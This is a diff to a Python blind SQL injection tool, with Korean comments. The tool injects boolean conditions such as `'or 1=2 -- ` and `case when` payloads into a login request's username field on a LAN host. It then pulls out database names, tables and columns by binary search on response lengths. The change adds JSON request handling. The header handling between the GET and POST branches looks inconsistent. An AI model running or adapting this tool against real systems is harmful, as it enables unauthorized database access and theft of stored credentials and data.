@@ -14,46 +14,63 @@ import requests
 import warnings
 import argparse
 import sqlite3
-
+import json
 warnings.filterwarnings('ignore')
 
 # 전역변수
 output_check = False
 args = None
-true_message_size = None # 참(ture)의 경우 message size
+false_message_size = None # 참(ture)의 경우 message size
 
 ########################################################################################################
-############## GET request 예시 ###############
+
 REQUEST_STRING = """
-GET /?username=aa'+or+1=1+--+&password=1234 HTTP/1.1
-Host: 192.168.219.100:5001
-Cache-Control: max-age=0
-Accept-Language: ko-KR,ko;q=0.9
+POST /api/login HTTP/1.1
+host: 192.168.219.100:5001
+Content-Length: 44
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Content-Type: application/json
+Accept: */*
 Origin: http://192.168.219.100:5001
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://192.168.219.100:5001/
-Accept-Encoding: gzip, deflate, br
-Cookie: security_level=0; PHPSESSID=8b9bc69d316ada9443e502f798cdb748
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
 Connection: keep-alive
+
+{"username":"'or 1=2 -- ","password":"1234"}
 """
-############ POST request 예시 ###############
+
+# ########################################################################################################
+
+# REQUEST_STRING = """
+# GET /?username='or+1=2+--+&password=1 HTTP/1.1
+# host: 192.168.219.100:5001
+# Upgrade-Insecure-Requests: 1
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+# Referer: http://192.168.219.100:5001/?username=&password=
+# Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+# Connection: keep-alive
+
+# # """
+
+######################################################################################################
+
 # REQUEST_STRING = """
 # POST / HTTP/1.1
 # User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
 # Accept-Encoding: gzip, deflate, br
 # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 # Connection: keep-alive
-# Host: 192.168.219.100:5001
+# host: 192.168.219.100:5001
 # Accept-Language: ko-KR,ko;q=0.9
 # Upgrade-Insecure-Requests: 1
 # Cookie: security_level=0; PHPSESSID=117eca5e7194d9415b200e7a15200933
 # Content-Type: application/x-www-form-urlencoded
 # Content-Length: 83
 
-# username='%7C%7C(case+when+1=1+then+'kazal92'+else+'test'+end)%7C%7C'&password=1234
+# username='%7C%7C(case+when+1=2+then+'kazal92'+else+'test'+end)%7C%7C'&password=1234
 # """
+
 ########################################################################################################
 
 
@@ -196,12 +213,14 @@ def parse_request(request):
 		for line in lines[2:]:
 			if ":" in line:
 				key, value = line.split(": ")
+				key = key.lower()
 				headers[key] = value # 딕셔너리에 {헤더 : 값}
 		for get_param in param.split("&"):
 			key, value = get_param.split("=", 1)
 			data[key] = value # 딕셔너리에 {파라미터 : 값}
-		url = headers['Host']   
+		url = headers['host']
 		condition = url_decode(data[args.parameter])
+
 
 	else: # 이외 POST 등 일경우 body 값 파싱
 		path = path_param.split("?", 1)[0]
@@ -210,12 +229,22 @@ def parse_request(request):
 			if ":" in line:
 				key, value = line.split(": ")
 				headers[key] = value
-		
-		for param in data_string.split("&"):
-			key, value = param.split("=", 1)
-			data[key] = value
-		url = headers['Host']   
-		condition = url_decode(data[args.parameter])
+		url = headers['host']
+
+		if 'application/json' in headers.get('Content-Type', ''):
+			try:
+				data = json.loads(data_string)  # JSON 파싱
+				condition = url_decode(data[args.parameter])
+
+			except json.JSONDecodeError:
+				print("JSON 파싱 오류 발생")
+		else:
+			for param in data_string.split("&"):
+				key, value = param.split("=", 1)
+				key = key.lower()
+				data[key] = value
+			url = headers['host']
+			condition = url_decode(data[args.parameter])
 
 	return (
 	{
@@ -231,7 +260,7 @@ def payload_set(condition, payloads):
 	for key, value in payloads.items():
 		result_payload[key] = {} # 중첩 딕셔너리 초기화
 		for key2, value2 in value.items():
-			payload_tmp = condition.replace('1=1', value2)
+			payload_tmp = condition.replace('1=2', value2)
 			result_payload[key][key2] = payload_tmp
 
 	return result_payload
@@ -333,32 +362,37 @@ def setpayload():
 def check_condition(data, method, url, path, headers):
 	data[args.parameter] = url_decode(data[args.parameter])
 
-	global true_message_size
+	global false_message_size
 	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
 	proxies = {'http': args.proxy, 'https': args.proxy}
 	timeout = 30
 	if method == 'GET':
 		url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
 		response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
-		true_message_size = len(response.content) # 저장
+		false_message_size = len(response.content) # 저장
 	else:
 		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
-		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
-		true_message_size = len(response.content) # 저장
+		if headers.get('Content-Type') == 'application/json':
+			response = requests.request(method, url, headers=headers, json=data, proxies=proxies, timeout=timeout, verify=False)
+			false_message_size = len(response.content) # 저장
+		else:
+			response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
+			false_message_size = len(response.content) # 저장
 	
 def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows_=None, select_db=None, select_table=None, select_column=None):
 	mid_val = int((min_val+max_val)/2)
 	payload_insert = payload_fix
 	
 	payload_insert = payload_insert.format(rows=rows_, substr_index=substr_index, mid_val=mid_val, select_db=select_db, select_table=select_table, select_column=select_column)
-	# print(payload_insert) # 페이로드 확인
+	# print(payload_insert) # 페이로드 확인\
+
 	data_val['data'][args.parameter] = payload_insert
 	
 	bin_result = connection(**data_val) # payload 삽입 및 요청
 	if max_val - min_val <= 1:
 		if bin_result:
 			return max_val
-		return min_val         
+		return min_val
 	if bin_result: # 30 130 160 / 2 = 80
 		return recursive(mid_val, max_val, data_val, payload_fix, substr_index, rows_, select_db, select_table, select_column)
 	return     recursive(min_val, mid_val, data_val, payload_fix, substr_index, rows_, select_db, select_table, select_column)
@@ -377,10 +411,14 @@ def connection(data, method, url, path, headers):
 		check_message_size = len(response.content)
 	else:
 		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
-		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
-		check_message_size = len(response.content)
+		if headers.get('Content-Type') == 'application/json':
+			response = requests.request(method, url, headers=headers, json=data, proxies=proxies, timeout=timeout, verify=False)
+			check_message_size = len(response.content)
+		else:
+			response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
+			check_message_size = len(response.content)
 
-	if true_message_size == check_message_size:
+	if false_message_size != check_message_size:
 		return 1    # true
 	return 0    # false
 
